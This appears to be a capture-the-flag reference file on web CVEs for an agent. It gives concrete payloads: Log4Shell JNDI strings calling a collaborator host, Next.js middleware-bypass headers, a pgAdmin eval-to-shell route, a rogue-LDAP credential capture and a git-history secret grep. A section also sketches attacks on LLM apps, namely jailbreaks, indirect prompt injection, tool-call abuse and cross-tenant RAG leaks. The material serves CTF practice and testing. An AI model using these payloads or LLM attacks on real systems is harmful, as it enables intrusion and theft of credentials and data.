# Web Vulnerabilities and CVEs

Use this reference for framework-, library-, and product-specific web vulnerabilities that can short-circuit normal exploit development.

## Table of Contents
- [When to use this file](#when-to-use-this-file)
- [High-value targets](#high-value-targets)
- [Common exploit classes](#common-exploit-classes)
- [Modern framework pivots](#modern-framework-pivots)
- [Triage workflow](#triage-workflow)

## When to use this file

Load this file when you already fingerprinted the stack or strongly suspect a product family, for example:
- Next.js
- Uvicorn / FastAPI
- WeasyPrint
- ExifTool-backed media processing
- Deno / Node frontend build chains
- browser behaviors that are version-sensitive

## High-value targets

Typical web CTF CVE buckets:
- auth or middleware bypasses
- SSRF and internal fetch abuse
- CRLF and header injection
- request splitting and parser differential issues
- file-read or upload-to-RCE product bugs
- admin-panel or CI/CD takeover bugs
- browser or headless automation quirks that leak tokens or enable JS unexpectedly

## Common exploit classes

Patterns that repeat across products:
- request metadata trusted too early (`Host`, middleware flags, forwarded headers)
- header/body boundary confusion
- parser inconsistency between validation function and transport function
- exposed or weakly protected helper endpoints
- attachment or document processors with side-fetch behavior
- optimistic trust in public keys, import maps, or external config
- JNDI lookups in logged/evaluated strings (Log4Shell pattern — any Java app using Log4j 2.x < 2.17)
- error-page reflection of request data — e.g. **Apache CVE-2012-0053**: an oversized `Cookie` header on old 2.2.x triggers a 400 whose error page reflects the offending cookie, leaking `HttpOnly` cookies to any XSS that can read the response body.

## LLM / AI chatbot targets

When the app is an LLM front-end, RAG pipeline, or agent with tools, the security lane is separate from generic web bugs — load the `llm-technique` skill for the OWASP LLM Top 10 workflow. Fast-triage anchors:

- **Direct jailbreak** (system-override, role-reversal, instruction-leak) — the noisiest lane; often mitigated.
- **Indirect prompt injection** — poison a retrieved doc, uploaded file, URL preview, or tool output the model ingests; the payload runs in the assistant turn, not the user turn.
- **Tool / function-call abuse** — if the app wires the LLM to server tools (search, fetch, DB, shell), coax the model into invoking a tool with attacker-chosen args; the app trusts the tool response for auth or state changes.
- **RAG cross-tenant leak** — "summarize the newest doc" / "cite chunk id N" enumerates other users' indexed content when the retriever lacks tenant scoping.

## Log4Shell and JNDI family (CVE-2021-44228)

Affects any Java application using Log4j 2.0-beta9 through 2.14.1. The logger evaluates `${jndi:ldap://...}` in message strings, triggering outbound LDAP/RMI connections to attacker infrastructure.

**Detection:** inject `${jndi:ldap://COLLABORATOR/x}` or `${jndi:dns://COLLABORATOR/x}` into any input the app might log (login fields, headers, user-agent, search queries, form values, URL paths).

**Exploitation on modern JDK (8u191+):** remote classloading blocked. Use BeanFactory/ELProcessor via `rogue-jndi` tool's `o=tomcat` route. Requires Tomcat on classpath (common: Spring Boot, UniFi, Solr, many enterprise apps).

**Post-exploitation pattern:** many Java applications (UniFi, Solr, Jenkins, etc.) have internal databases or configs with plaintext credentials. After initial shell, enumerate local services.

**Related CVEs:** CVE-2021-45046 (bypass of 2.15.0 fix), CVE-2021-45105 (DoS), CVE-2021-44832 (JDBC appender RCE). Spring4Shell (CVE-2022-22965) uses similar classloader manipulation but different entry point.

## Modern framework pivots

React Server Components / Next.js:
- If responses or requests expose `Next-Action`, `text/x-component`, Flight payloads, or App Router server-action behavior, check React Server Components handling before generic Node payload iteration.
- CVE-2025-55182 affects the React Server Components server-function protocol and is surfaced through frameworks such as Next.js. In CTFs, treat it as a stack-fingerprinted deserialization/Flight-protocol lane, not as a blind spray.
- CVE-2025-29927 (Next.js middleware auth bypass, < 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5): send `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` (15.x) or `x-middleware-subrequest: pages/_middleware` (12.x–13.x) to skip middleware and reach protected routes directly. Confirm by requesting a middleware-gated path with and without the header and diffing status/body.
- Useful proof signals are server-action responses, redirect/error headers, a harmless callback, or a controlled file-read/command echo in the challenge container.

Framework routing:
- Compare middleware checks with final route handlers, especially around encoded slashes, trailing dots, locale/basePath prefixes, rewrite rules, and method overrides.
- For serverless and edge runtimes, check whether the edge layer authenticates one normalized URL while the origin receives another.

Document and media processors:
- If upload handling invokes PDF/image/Office converters, model both the parser and the fetcher: local file reads, SSRF, attachment embedding, metadata execution, and archive expansion are separate lanes.

## AD-integrated web apps (web → domain pivots)

On Windows/AD boxes the web tier is usually the door to a domain credential. Fingerprint these and
route the loot into the AD phase (`active-directory-technique`).

- **Gitea / GitLab / Gogs**: authenticate with any reused cred (`/api/v1/user`), enumerate repos
  (`/api/v1/repos/search`). **Mine full git history** — `.env`/`DATABASE_URL`/`SECRET_KEY` deleted in a
  later commit still live: `git log --all -p | grep -iE 'pass|secret|_url|token'`. With DB access to
  Gitea's backing store you can read every repo/user.
- **pgAdmin 4 ≤ 9.1 — CVE-2025-2945 (authenticated Query Tool RCE)**: two `eval()` sinks —
  `query_commited` in `POST /sqleditor/query_tool/download/<tid>` and `high_availability` in
  `/cloud/deploy`. Needs pgAdmin login + valid **DB creds** to init the SQL editor (get a trans_id via
  `/sqleditor/initialize/sqleditor/<tid>/<sgid>/<sid>/<did>`), then send a Python expression
  (`__import__("os").system(...)`). CSRF is session-bound (token from `/login` works for all API
  calls). RCE runs as the pgAdmin service acct — usually a container; pivot from there.
- **PWM (password self-service) — recover the LDAP proxy credential**: PWM binds to AD with a service
  account. Routes to its cleartext:
  - **Read the config file** (`PwmConfiguration.xml`, if you reach the host): `ldap.proxy.username` is
    plaintext; `ldap.proxy.password` is `ENC-PW:` (key = config `createTime` + `"StoredConfiguration"`).
  - **Rogue-LDAP capture (deterministic)**: crack the config password (bcrypt in
    `configPasswordHash`, often low cost → rockyou), log into `/pwm/private/config/login`, point
    `ldap.serverUrls` at `ldap://<you>:389`, then trigger `processAction=ldapHealthCheck` in the config
    editor. PWM sends a cleartext simple bind (DN + password in the first PDU) — catch it with a raw
    socket. Same idea when PWM is in configuration mode (editor open, no password).
  - PWM self-service is gated behind `ERROR_APPLICATION_NOT_RUNNING (5084)` until the config is
    "restricted" — config/editor still binds the proxy, which is all you need.

## Triage workflow

1. fingerprint exact framework or component from headers, static files, stack traces, source, or lockfiles
2. check version only as precisely as needed
3. test one stack-matching bypass first
4. if positive, chain only toward objective proof
5. if negative, fall back to generic references instead of CVE thrash

Primary external anchors for current RSC/Next.js issues:
- React advisory: https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
- Next.js advisory: https://github.com/vercel/next.js/security/advisories/GHSA-9qr9-h5gf-34mp

## See also

- `server-injection.md` — generic server-side sinks
- `server-execution.md` — execution and advanced chains
- `auth-access-control.md` — token and auth-impacting bugs
